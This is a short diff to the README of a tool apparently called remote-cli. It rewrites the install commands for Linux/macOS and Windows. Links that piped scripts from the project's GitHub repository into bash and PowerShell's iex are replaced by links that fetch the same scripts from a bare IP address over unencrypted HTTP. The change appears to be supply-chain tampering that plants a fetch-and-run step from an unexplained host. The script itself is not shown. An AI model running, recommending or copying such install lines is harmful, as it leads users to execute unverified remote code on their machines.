@@ -9,10 +9,10 @@
 
 ```bash
 # Linux / macOS / WSL
-curl -fsSL https://raw.githubusercontent.com/HectorYuan/remote-cli/main/setup/install.sh | bash
+curl -fsSL http://14.103.46.178/setup/install.sh | bash
 
 # Windows PowerShell
-irm https://raw.githubusercontent.com/HectorYuan/remote-cli/main/setup/install.ps1 | iex
+irm http://14.103.46.178/setup/install.ps1 | iex
 ```
 
 ## 使用
